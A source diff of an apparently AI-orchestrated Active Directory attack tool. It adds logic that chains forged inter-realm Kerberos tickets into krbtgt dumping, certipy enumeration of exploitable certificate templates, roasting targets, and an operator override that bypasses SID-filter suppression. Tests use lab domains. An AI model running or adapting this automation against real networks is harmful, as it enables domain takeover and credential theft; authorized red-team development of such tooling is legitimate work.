                                 "forge_inter_realm_and_dump completed but no target krbtgt observed — locking dedup, waking fallbacks (vuln NOT marked exploited; only target krbtgt capture proves compromise)"
                             );
                             let _ = vuln_id_bg; // intentionally unused — see comment above
+
+                            // Park the material this empty dump was produced
+                            // with so `sweep_rearmable_empty_dump_forges` can
+                            // re-arm if a later extraction lands a different
+                            // trust key. Without this the lock is permanent
+                            // even when the key that would have worked arrives
+                            // seconds later.
+                            {
+                                let mut state = dispatcher_bg.state.write().await;
+                                let material = format!(
+                                    "{}:{}",
+                                    trust_key_bg.to_lowercase(),
+                                    aes_key_bg.as_deref().unwrap_or("").to_lowercase()
+                                );
+                                let attempts = state
+                                    .forge_empty_dump
+                                    .get(&dedup_key_bg)
+                                    .map_or(0, |e| e.attempts);
+                                state.forge_empty_dump.insert(
+                                    dedup_key_bg.clone(),
+                                    EmptyDumpForge {
+                                        source_domain: source_domain_bg.clone(),
+                                        target_domain: target_domain_bg.clone(),
+                                        trust_account: trust_account_bg.clone(),
+                                        material,
+                                        attempts,
+                                    },
+                                );
+                            }
 
                             // Dump-phase failure (SID filtering missed by
                             // is_filtered_inter_forest_trust, DRSUAPI denial
@@ -2190,6 +2195,17 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                         clear_dedup().await;
                     }
                 }
+                // Spawn body finished (any branch). Drop the heartbeat so the
+                // staleness sweep doesn't later "recover" a dispatch that
+                // already completed normally — `clear_dedup` covers the Err
+                // arm but the Ok arms (krbtgt found vs not) intentionally
+                // keep dedup MARKED and need this cleanup explicitly.
+                dispatcher_bg
+                    .state
+                    .write()
+                    .await
+                    .forge_in_flight
+                    .remove(&dedup_key_bg);
             });
         }
     }
@@ -2416,7 +2432,8 @@ async fn dispatch_post_ticket_user_enumeration(
             "  {\"username\": \"samaccountname\", \"domain\": \"target.domain\", ",
             "\"source\": \"ldap_enumeration\", \"memberOf\": [\"Group1\"]}\n",
             "Flag DoesNotRequirePreAuth as vuln_type='asrep_roastable' and SPNs as ",
-            "vuln_type='kerberoastable'."
+            "vuln_type='kerberoastable'. For those findings set the finding `target` to ",
+            "the affected account's sAMAccountName (not an IP or DC hostname) so it is roasted."
         ),
     });
 
@@ -2551,6 +2568,191 @@ async fn dispatch_post_ticket_acl_enumeration(
     }
 }
 
+/// True when `cred` can enumerate `target_domain`'s CA as a *native* principal:
+/// a same-domain, non-machine account with a recovered password. A native
+/// enrollee is a member of the target's Domain Users, so certipy flags
+/// enrollee-supplies-subject templates (ESC1) as vulnerable-for-us; the forged
+/// cross-forest Administrator is not, leaving them undiscovered. Delegation and
+/// quarantine exclusions are applied by the caller (they need `&StateInner`).
+fn is_native_adcs_enum_candidate(
+    cred: &ares_core::models::Credential,
+    target_domain: &str,
+) -> bool {
+    !cred.password.is_empty()
+        && cred.domain.eq_ignore_ascii_case(target_domain)
+        && !cred.username.trim_end().ends_with('$')
+}
+
+/// Outcome of one post-ticket `certipy find` dispatch.
+enum AdcsEnumOutcome {
+    /// certipy find completed and surfaced this many vulnerabilities.
+    Found(usize),
+    /// The tool errored or the dispatch itself failed — nothing was enumerated.
+    Failed,
+}
+
+/// Dispatch a single post-ticket `certipy find` against `target_domain`'s CA as
+/// `principal`, log the result, and report whether it surfaced vulnerabilities.
+/// `native` only labels the log line (true = same-domain enrollee, false = the
+/// forged cross-forest Administrator).
+async fn run_post_ticket_adcs_enum(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+    target_dc_ip: &str,
+    principal: &str,
+    native: bool,
+) -> AdcsEnumOutcome {
+    let tool_args = json!({
+        "domain": target_domain,
+        "dc_ip": target_dc_ip,
+        "username": principal,
+    });
+    let call = ToolCall {
+        id: format!("post_ticket_adcs_{}", uuid::Uuid::new_v4().simple()),
+        name: "certipy_find".to_string(),
+        arguments: tool_args,
+    };
+    let task_id = format!(
+        "post_ticket_adcs_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+
+    info!(
+        task_id = %task_id,
+        source_domain,
+        target_domain,
+        principal,
+        native,
+        "Post-ticket ADCS enumeration dispatched"
+    );
+
+    match dispatcher
+        .llm_runner
+        .tool_dispatcher()
+        .dispatch_tool("privesc", &task_id, &call)
+        .await
+    {
+        Ok(exec) => {
+            if let Some(err) = exec.error {
+                warn!(
+                    err = %err,
+                    source_domain,
+                    target_domain,
+                    principal,
+                    "Post-ticket ADCS enumeration returned tool error"
+                );
+                return AdcsEnumOutcome::Failed;
+            }
+            let vuln_count = exec
+                .discoveries
+                .as_ref()
+                .and_then(|d| d.get("vulnerabilities"))
+                .and_then(|v| v.as_array())
+                .map(|v| v.len())
+                .unwrap_or(0);
+            info!(
+                source_domain,
+                target_domain, principal, vuln_count, "Post-ticket ADCS enumeration completed"
+            );
+            AdcsEnumOutcome::Found(vuln_count)
+        }
+        Err(e) => {
+            warn!(
+                err = %e,
+                source_domain,
+                target_domain,
+                principal,
+                "Post-ticket ADCS enumeration dispatch failed"
+            );
+            AdcsEnumOutcome::Failed
+        }
+    }
+}
+
+/// Enumerate ADCS templates and CAs in the target forest with the forged
+/// inter-realm ticket.
+///
+/// The foreign CA rejects NTLM RPC (`ept_s_not_registered` /
+/// `rpc_s_access_denied`) across a SID-filtered trust, so the LLM's ADCS recon
+/// stalls there. certipy authenticates its LDAP + CA RPC over `-k -no-pass`
+/// (KRB5CCNAME) once the credential resolver injects `ticket_path` for the
+/// target realm — the certipy subset of Bug B, gated by
+/// `is_cross_forest_certipy_tool` and keyed off the `domain` argument set here.
+/// Running `certipy find` directly surfaces ESC1/2/3/4/9/13/15 templates into
+/// state so the ADCS automations (which now issue `certipy req` with the same
+/// ccache) have targets without waiting for another recon round.
+///
+/// Principal selection: prefer a native target-domain enrollee (see
+/// `is_native_adcs_enum_candidate`) because only a Domain Users member gets
+/// certipy to flag the enrollee-supplies-subject (ESC1) templates as
+/// vulnerable-for-us. Fall back to the forged cross-forest Administrator when no
+/// native credential exists *or* when the native bind surfaced nothing — a
+/// recovered password can be stale/rotated, and a failed native bind must not
+/// leave the CA un-enumerated. The Administrator ccache path is what the
+/// pre-native code always used; it soft-skips when no forged ccache exists
+/// rather than attempting a doomed cross-forest NTLM bind.
+async fn dispatch_post_ticket_adcs_enumeration(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+) {
+    let (target_dc_ip, native_user) = {
+        let s = dispatcher.state.read().await;
+        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
+            warn!(
+                source_domain,
+                target_domain, "post-ticket ADCS enum skipped: no DC IP for target domain"
+            );
+            return;
+        };
+        let native_user = s
+            .credentials
+            .iter()
+            .find(|c| {
+                is_native_adcs_enum_candidate(c, target_domain)
+                    && !s.is_delegation_account(&c.username)
+                    && !s.is_principal_quarantined(&c.username, &c.domain)
+            })
+            .map(|c| c.username.clone());
+        (dc_ip, native_user)
+    };
+
+    // Try the native enrollee first: only it surfaces the ESC1 templates a
+    // cross-forest Administrator can't. Then fall back to Administrator unless
+    // that native run already found vulnerabilities — so a stale/rotated native
+    // password can never leave the CA un-enumerated versus the old
+    // always-Administrator behaviour.
+    let native_found_vulns = if let Some(user) = &native_user {
+        matches!(
+            run_post_ticket_adcs_enum(
+                dispatcher,
+                source_domain,
+                target_domain,
+                &target_dc_ip,
+                user,
+                true,
+            )
+            .await,
+            AdcsEnumOutcome::Found(n) if n > 0
+        )
+    } else {
+        false
+    };
+
+    if !native_found_vulns {
+        run_post_ticket_adcs_enum(
+            dispatcher,
+            source_domain,
+            target_domain,
+            &target_dc_ip,
+            "Administrator",
+            false,
+        )
+        .await;
+    }
+}
+
 /// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
 ///
 /// Called from the suppression branch of `auto_trust_follow` when
@@ -2577,6 +2779,16 @@ async fn dispatch_create_inter_realm_ticket(
     source_domain_sid: Option<&str>,
 ) {
     use ares_llm::ToolCall;
+
+    tracing::info!(
+        convergence_stage = 3,
+        event = "dispatch_create_inter_realm_ticket",
+        source_domain,
+        target_domain,
+        has_aes = aes_key.is_some(),
+        has_source_sid = source_domain_sid.is_some_and(|s| !s.is_empty()),
+        "convergence: dispatching inter-realm TGT forge for target realm"
+    );
 
     let ticket_username = "Administrator";
 
@@ -2644,7 +2856,7 @@ async fn dispatch_create_inter_realm_ticket(
         source_domain,
         target_domain,
         task_id = %task_id,
-        args = %call.arguments,
+        args = %ares_tools::redact::redact_tool_arguments(&call.arguments),
         "Dispatching create_inter_realm_ticket for SID-filtered trust (Kerberos LDAP path)"
     );
 
@@ -2686,8 +2898,25 @@ async fn dispatch_create_inter_realm_ticket(
                 source_domain,
                 target_domain,
                 ticket_path = %ticket_path,
-                output_tail = %result.output.lines().rev().take(20).collect::<Vec<_>>().into_iter().rev().collect::<Vec<_>>().join(" | "),
                 "Inter-realm ticket forged — persisting for Kerberos LDAP tools"
+            );
+            let output_tail = ares_tools::redact::redact_text(
+                &result
+                    .output
+                    .lines()
+                    .rev()
+                    .take(20)
+                    .collect::<Vec<_>>()
+                    .into_iter()
+                    .rev()
+                    .collect::<Vec<_>>()
+                    .join(" | "),
+            );
+            tracing::debug!(
+                source_domain,
+                target_domain,
+                output_tail = %output_tail,
+                "create_inter_realm_ticket output tail"
             );
 
             let ticket = ares_core::models::KerberosTicket {
@@ -2722,6 +2951,13 @@ async fn dispatch_create_inter_realm_ticket(
             dispatch_post_ticket_secretsdump(dispatcher, source_domain, target_domain).await;
 
             dispatch_post_ticket_acl_enumeration(dispatcher, source_domain, target_domain).await;
+
+            // Enumerate the foreign forest's CA over the same ccache. NTLM RPC
+            // to a cross-forest CA is rejected; `-k -no-pass` with the forged
+            // ticket is the only path that reaches it. Discovered ESC templates
+            // feed the ADCS automations, which now issue `certipy req` with the
+            // ccache too (Bug B, certipy subset).
+            dispatch_post_ticket_adcs_enumeration(dispatcher, source_domain, target_domain).await;
         }
         Err(e) => {
             tracing::warn!(
@@ -2731,6 +2967,93 @@ async fn dispatch_create_inter_realm_ticket(
                 "create_inter_realm_ticket dispatch error"
             );
         }
+    }
+}
+
+/// Drain operator escape-hatch inter-realm forge requests and dispatch each.
+///
+/// `ares ops force-inter-realm-forge` RPUSHes [`ForceInterRealmForgeRequest`]
+/// blobs onto `ares:op:{id}:force_forge_requests`. This runs at the top of
+/// every trust tick: it LPOPs pending requests, primes the target DC into
+/// state (so the forge can chain cifs/ + ldap/ service tickets even if the auto
+/// path never discovered it), then calls `dispatch_create_inter_realm_ticket`
+/// directly — bypassing the SID-filter suppression and trust_follow dedup that
+/// gate the automatic path. Bounded per tick so a flooded list can't starve the
+/// rest of the loop.
+async fn drain_force_forge_requests(dispatcher: &Dispatcher) {
+    use ares_core::models::ForceInterRealmForgeRequest;
+
+    let key = ares_core::state::build_key(
+        &dispatcher.config.operation_id,
+        ares_core::state::KEY_FORCE_FORGE_REQUESTS,
+    );
+    let mut conn = dispatcher.queue.connection();
+
+    for _ in 0..16 {
+        let raw: Option<String> = match redis::cmd("LPOP").arg(&key).query_async(&mut conn).await {
+            Ok(v) => v,
+            Err(e) => {
+                warn!(err = %e, "force_forge drain: LPOP failed");
+                return;
+            }
+        };
+        let Some(raw) = raw else {
+            return; // list drained
+        };
+        let request: ForceInterRealmForgeRequest = match serde_json::from_str(&raw) {
+            Ok(r) => r,
+            Err(e) => {
+                warn!(
+                    err = %e,
+                    raw_len = raw.len(),
+                    "force_forge drain: bad request JSON, skipping"
+                );
+                continue;
+            }
+        };
+
+        info!(
+            source_domain = %request.source_domain,
+            target_domain = %request.target_domain,
+            "Operator force-inter-realm-forge request dequeued — dispatching (bypasses SID-filter + dedup)"
+        );
+
+        // Prime the target DC in-memory so the forge's state read resolves it.
+        // Enough for the synchronous dispatch below; not persisted to Redis.
+        if let Some(ip) = request.target_dc_ip.as_deref() {
+            let mut state = dispatcher.state.write().await;
+            state
+                .domain_controllers
+                .entry(request.target_domain.to_lowercase())
+                .or_insert_with(|| ip.to_string());
+            if let Some(fqdn) = request.target_dc_fqdn.as_deref() {
+                let known = state
+                    .hosts
+                    .iter()
+                    .any(|h| h.ip == ip && h.hostname.eq_ignore_ascii_case(fqdn));
+                if !known {
+                    state.hosts.push(ares_core::models::Host {
+                        ip: ip.to_string(),
+                        hostname: fqdn.to_string(),
+                        os: String::new(),
+                        roles: Vec::new(),
+                        services: Vec::new(),
+                        is_dc: true,
+                        owned: false,
+                    });
+                }
+            }
+        }
+
+        dispatch_create_inter_realm_ticket(
+            dispatcher,
+            &request.source_domain,
+            &request.target_domain,
+            &request.trust_key,
+            request.aes_key.as_deref(),
+            request.source_sid.as_deref(),
+        )
+        .await;
     }
 }
 
@@ -2767,6 +3090,54 @@ mod tests {
     }
 
     #[test]
+    fn trust_event_fields_parent_to_child_is_intra_forest() {
+        let (desc, techniques) =
+            super::trust_escalation_event_fields("contoso.local", "child.contoso.local", "CHILD$");
+        assert!(
+            desc.starts_with("Parent-to-child ExtraSid escalation:"),
+            "parent->child must not be described as a forest trust: {desc}"
+        );
+        assert_eq!(techniques, vec!["T1134.005", "T1003.006"]);
+    }
+
+    #[test]
+    fn trust_event_fields_child_to_parent_is_intra_forest() {
+        let (desc, techniques) = super::trust_escalation_event_fields(
+            "child.contoso.local",
+            "contoso.local",
+            "CONTOSO$",
+        );
+        assert!(desc.starts_with("Child-to-parent ExtraSid escalation:"));
+        assert_eq!(techniques, vec!["T1134.005", "T1003.006"]);
+    }
+
+    #[test]
+    fn trust_event_fields_inter_forest_keeps_t1550() {
+        let (desc, techniques) =
+            super::trust_escalation_event_fields("contoso.local", "fabrikam.local", "FABRIKAM$");
+        assert!(desc.starts_with("Forest trust escalation:"));
+        assert_eq!(techniques, vec!["T1134.005", "T1550.003"]);
+    }
+
+    #[test]
+    fn trust_event_fields_agree_with_vuln_classification() {
+        for (source, target) in [
+            ("contoso.local", "child.contoso.local"),
+            ("child.contoso.local", "contoso.local"),
+            ("contoso.local", "fabrikam.local"),
+        ] {
+            let (_, vuln_type, _) = super::classify_trust_escalation(source, target);
+            let (desc, _) = super::trust_escalation_event_fields(source, target, "TRUST$");
+            let event_says_forest = desc.starts_with("Forest trust escalation:");
+            assert_eq!(
+                event_says_forest,
+                vuln_type == "forest_trust_escalation",
+                "{source} -> {target}: vuln_type={vuln_type} but event said {desc}"
+            );
+        }
+    }
+
+    #[test]
     fn forest_trust_vuln_id_basic() {
         assert_eq!(
             forest_trust_vuln_id("contoso.local", "fabrikam.local"),
@@ -2785,6 +3156,301 @@ mod tests {
     #[test]
     fn forest_trust_vuln_id_empty_strings() {
         assert_eq!(forest_trust_vuln_id("", ""), "forest_trust__");
+    }
+
+    fn dc(ip: &str, hostname: &str) -> ares_core::models::Host {
+        ares_core::models::Host {
+            ip: ip.into(),
+            hostname: hostname.into(),
+            os: String::new(),
+            roles: Vec::new(),
+            services: Vec::new(),
+            is_dc: true,
+            owned: false,
+        }
+    }
+
+    fn no_netbios() -> std::collections::HashMap<String, String> {
+        std::collections::HashMap::new()
+    }
+
+    fn netbios(pairs: &[(&str, &str)]) -> std::collections::HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(n, f)| ((*n).to_string(), (*f).to_string()))
+            .collect()
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_uses_the_netbios_map_when_the_only_record_is_the_apex() {
+        let hosts = [dc("192.168.58.10", "contoso.local")];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &netbios(&[("DC01", "dc01.contoso.local")]),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_ignores_netbios_entries_outside_the_target_domain() {
+        let hosts = [dc("192.168.58.10", "contoso.local")];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &netbios(&[
+                    ("DC02", "dc02.child.contoso.local"),
+                    ("WS01", "ws01.fabrikam.local"),
+                ]),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "192.168.58.10"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_is_stable_when_several_netbios_entries_qualify() {
+        let hosts = [dc("192.168.58.10", "contoso.local")];
+        let map = netbios(&[
+            ("DC02", "dc02.contoso.local"),
+            ("DC01", "dc01.contoso.local"),
+            ("CA01", "ca01.contoso.local"),
+        ]);
+        let first = resolve_target_dc_hostname(&hosts, &map, &[], "192.168.58.10", "contoso.local");
+        for _ in 0..32 {
+            assert_eq!(
+                resolve_target_dc_hostname(&hosts, &map, &[], "192.168.58.10", "contoso.local"),
+                first
+            );
+        }
+        assert_eq!(first, "ca01.contoso.local");
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_prefers_a_real_host_record_over_the_netbios_map() {
+        let hosts = [dc("192.168.58.10", "dc01.contoso.local")];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &netbios(&[("CA01", "ca01.contoso.local")]),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_prefers_the_record_for_the_target_dc_ip() {
+        let hosts = [
+            dc("192.168.58.10", "dc01.contoso.local"),
+            dc("192.168.58.20", "dc02.child.contoso.local"),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_skips_the_zone_apex_for_a_sibling_record() {
+        // The target DC's own record carries the bare-domain A record, so the
+        // IP match is rejected and the suffix scan supplies the real FQDN.
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.11", "dc01.contoso.local"),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_never_returns_a_child_domain_dc() {
+        // Regression: `ends_with(".contoso.local")` matched the CHILD domain's
+        // DC, so the parent forge asked the parent KDC for a principal in the
+        // child realm — KDC_ERR_WRONG_REALM on every retry, forever. Falling
+        // back to the IP is correct here: no DC record for contoso.local
+        // itself is known yet.
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.20", "dc02.child.contoso.local"),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "192.168.58.10"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_never_returns_a_child_domain_apex() {
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.20", "child.contoso.local"),
+        ];
+        let known = [
+            "contoso.local".to_string(),
+            "child.contoso.local".to_string(),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &known,
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "192.168.58.10"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_skips_a_child_apex_to_reach_the_netbios_map() {
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.20", "child.contoso.local"),
+        ];
+        let known = [
+            "contoso.local".to_string(),
+            "child.contoso.local".to_string(),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &netbios(&[
+                    ("CHILD", "child.contoso.local"),
+                    ("DC01", "dc01.contoso.local"),
+                ]),
+                &known,
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_child_apex_guard_survives_a_trailing_dot_and_case() {
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.20", "CHILD.CONTOSO.LOCAL."),
+        ];
+        let known = ["Child.Contoso.Local.".to_string()];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &known,
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "192.168.58.10"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_still_accepts_a_host_that_is_not_a_known_domain() {
+        let hosts = [
+            dc("192.168.58.10", "contoso.local"),
+            dc("192.168.58.20", "dc01.contoso.local"),
+        ];
+        let known = [
+            "contoso.local".to_string(),
+            "child.contoso.local".to_string(),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &known,
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "dc01.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_matches_a_grandchild_domain_no_better() {
+        let hosts = [dc("192.168.58.30", "dc03.sub.child.contoso.local")];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "192.168.58.10"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_resolves_a_child_domain_target_directly() {
+        // The child IS the target domain here, so its DC must be selected.
+        let hosts = [
+            dc("192.168.58.10", "dc01.contoso.local"),
+            dc("192.168.58.20", "dc02.child.contoso.local"),
+        ];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.99",
+                "child.contoso.local"
+            ),
+            "dc02.child.contoso.local"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_is_case_insensitive() {
+        let hosts = [dc("192.168.58.11", "DC01.CONTOSO.LOCAL")];
+        assert_eq!(
+            resolve_target_dc_hostname(
+                &hosts,
+                &no_netbios(),
+                &[],
+                "192.168.58.10",
+                "contoso.local"
+            ),
+            "DC01.CONTOSO.LOCAL"
+        );
+    }
+
+    #[test]
+    fn resolve_target_dc_hostname_falls_back_to_ip_with_no_hosts() {
+        assert_eq!(
+            resolve_target_dc_hostname(&[], &no_netbios(), &[], "192.168.58.10", "contoso.local"),
+            "192.168.58.10"
+        );
     }
 
     #[test]
@@ -2898,7 +3564,7 @@ mod tests {
     }
 
     #[test]
-    fn filtered_inter_forest_explicit_filtering_on() {
+    fn filtered_inter_forest_explicit_filtering_on_still_tries_forge() {
         let trust = ares_core::models::TrustInfo {
             domain: "fabrikam.local".into(),
             flat_name: "FABRIKAM".into(),
@@ -2908,7 +3574,7 @@ mod tests {
             security_identifier: None,
         };
         let s = state_with_trust("fabrikam.local", trust);
-        assert!(is_filtered_inter_forest_trust(
+        assert!(!is_filtered_inter_forest_trust(
             &s,
             "contoso.local",
             "fabrikam.local"
@@ -2934,11 +3600,8 @@ mod tests {
     }
 
     #[test]
-    fn filtered_inter_forest_no_metadata_tries_forge() {
+    fn auto_trust_follow_tries_forge_when_metadata_missing() {
         let s = StateInner::new("op-test".into());
-        // No TrustInfo for the target. Without explicit filtering metadata we
-        // try the forge — the cost of an unnecessary attempt (~30s) is cheaper
-        // than silently dropping a valid attack on a misconfigured trust.
         assert!(!is_filtered_inter_forest_trust(
             &s,
             "contoso.local",
@@ -2950,8 +3613,9 @@ mod tests {
     fn filtered_inter_forest_ignores_unrelated_source_metadata() {
         // A child-realm parent_child TrustInfo on the source must NOT answer
         // an unrelated cross-forest path: that would misclassify it as
-        // intra-forest. With no metadata for the actual target we try the
-        // forge rather than silently suppressing it.
+        // intra-forest and let a doomed forge fire under the source's own
+        // parent_child relationship. With no metadata for the actual target
+        // we fall through to the no-metadata default (try the forge).
         let parent_trust = ares_core::models::TrustInfo {
             domain: "contoso.local".into(),
             flat_name: "CONTOSO".into(),
@@ -2961,7 +3625,6 @@ mod tests {
             security_identifier: None,
         };
         let s = state_with_trust("contoso.local", parent_trust);
-        // Target fabrikam.local has no metadata — try the forge.
         assert!(!is_filtered_inter_forest_trust(
             &s,
             "contoso.local",
@@ -2970,9 +3633,7 @@ mod tests {
     }
 
     #[test]
-    fn filtered_inter_forest_target_metadata_authoritative() {
-        // When the target's TrustInfo says cross-forest with SID filtering,
-        // suppress the forge regardless of any source-side parent_child entry.
+    fn filtered_inter_forest_target_metadata_never_suppresses_cross_forest() {
         let target_trust = ares_core::models::TrustInfo {
             domain: "fabrikam.local".into(),
             flat_name: "FABRIKAM".into(),
@@ -2982,7 +3643,7 @@ mod tests {
             security_identifier: None,
         };
         let s = state_with_trust("fabrikam.local", target_trust);
-        assert!(is_filtered_inter_forest_trust(
+        assert!(!is_filtered_inter_forest_trust(
             &s,
             "contoso.local",
             "fabrikam.local"
@@ -3239,12 +3900,302 @@ mod tests {
         assert_eq!(vuln_id_a, vuln_id_b);
     }
 
-    // ── helpers for new child-to-parent work tests ───────────────────────
+    /// Simulate "in flight for longer than allowed" by offsetting the start
+    /// timestamp into the past — direct Instant subtraction past program
+    /// start would panic, so use checked_sub and fall back to "now" only if
+    /// the test runner literally just booted.
+    fn stale_instant() -> Instant {
+        Instant::now()
+            .checked_sub(FORGE_STALENESS_LIMIT + Duration::from_secs(1))
+            .unwrap_or_else(Instant::now)
+    }
 
-    fn make_admin_hash(domain: &str, value: &str) -> ares_core::models::Hash {
+    #[test]
+    fn sweep_clears_stale_entry_and_unmarks_dedup() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:contoso.local:fabrikam$".to_string();
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+        s.forge_in_flight.insert(key.clone(), stale_instant());
+
+        let cleared = sweep_stale_forge_in_flight(&mut s);
+
+        assert_eq!(cleared, vec![key.clone()]);
+        assert!(s.forge_in_flight.is_empty());
+        assert!(
+            !s.is_processed(DEDUP_TRUST_FOLLOW, &key),
+            "dedup must be unmarked so the next tick re-dispatches"
+        );
+    }
+
+    /// The wedge exists to stop a hot loop against a target that cannot work
+    /// (363 retries in 50 min were observed). While recon still resolves the
+    /// same wrong host, it must stay held.
+    #[test]
+    fn wedged_forge_stays_held_while_recon_is_unchanged() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:contoso.local:fabrikam$".to_string();
+        s.hosts
+            .push(dc("192.168.58.99", "dc02.child.contoso.local"));
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+        s.forge_wedged.insert(
+            key.clone(),
+            WedgedForge {
+                target_domain: "contoso.local".into(),
+                target_dc_ip: "192.168.58.99".into(),
+                hostname: resolve_target_dc_hostname(
+                    &s.hosts,
+                    &no_netbios(),
+                    &[],
+                    "192.168.58.99",
+                    "contoso.local",
+                ),
+            },
+        );
+
+        assert!(sweep_rearmable_forge_wedges(&mut s).is_empty());
+        assert!(
+            s.is_processed(DEDUP_TRUST_FOLLOW, &key),
+            "an unchanged target must not re-dispatch the identical request"
+        );
+    }
+
+    /// A real DC FQDN in the target domain is exactly what makes the retry
+    /// succeed. Previously the mark was held forever — the wedge dropped the
+    /// `forge_in_flight` heartbeat, and the staleness sweep can only recover
+    /// keys that still have one — so the pivot stayed dead for the whole op.
+    #[test]
+    fn wedged_forge_rearms_once_recon_resolves_a_better_target() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:contoso.local:fabrikam$".to_string();
+        s.hosts
+            .push(dc("192.168.58.99", "dc02.child.contoso.local"));
+        let failed = resolve_target_dc_hostname(
+            &s.hosts,
+            &no_netbios(),
+            &[],
+            "192.168.58.10",
+            "contoso.local",
+        );
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+        s.forge_wedged.insert(
+            key.clone(),
+            WedgedForge {
+                target_domain: "contoso.local".into(),
+                target_dc_ip: "192.168.58.10".into(),
+                hostname: failed,
+            },
+        );
+
+        s.hosts.push(dc("192.168.58.10", "dc01.contoso.local"));
+
+        assert_eq!(sweep_rearmable_forge_wedges(&mut s), vec![key.clone()]);
+        assert!(
+            !s.is_processed(DEDUP_TRUST_FOLLOW, &key),
+            "dedup must be unmarked so the next tick retries against the real DC"
+        );
+        assert!(s.forge_wedged.is_empty());
+    }
+
+    fn trust_hash(
+        account: &str,
+        domain: &str,
+        ntlm: &str,
+        aes: Option<&str>,
+    ) -> ares_core::models::Hash {
         ares_core::models::Hash {
-            id: format!("h-admin-{domain}"),
-            username: "Administrator".into(),
+            id: String::new(),
+            username: account.into(),
+            hash_value: ntlm.into(),
+            hash_type: "ntlm".into(),
+            domain: domain.into(),
+            cracked_password: None,
+            source: String::new(),
+            discovered_at: None,
+            parent_id: None,
+            attack_step: 0,
+            aes_key: aes.map(str::to_string),
+            is_previous: false,
+            source_host: None,
+            is_trust_key: true,
+            trust_pair_label: None,
+        }
+    }
+
+    fn park_empty_dump(s: &mut StateInner, key: &str, material: &str, attempts: u32) {
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.to_string());
+        s.forge_empty_dump.insert(
+            key.to_string(),
+            EmptyDumpForge {
+                source_domain: "contoso.local".into(),
+                target_domain: "fabrikam.local".into(),
+                trust_account: "FABRIKAM$".into(),
+                material: material.into(),
+                attempts,
+            },
+        );
+    }
+
+    #[test]
+    fn empty_dump_forge_stays_locked_when_the_trust_material_is_unchanged() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:fabrikam.local:FABRIKAM$";
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "aabb", None));
+        park_empty_dump(&mut s, key, "aabb:", 0);
+
+        assert!(sweep_rearmable_empty_dump_forges(&mut s).is_empty());
+        assert!(
+            s.is_processed(DEDUP_TRUST_FOLLOW, key),
+            "re-forging with identical material repeats the identical empty dump"
+        );
+    }
+
+    #[test]
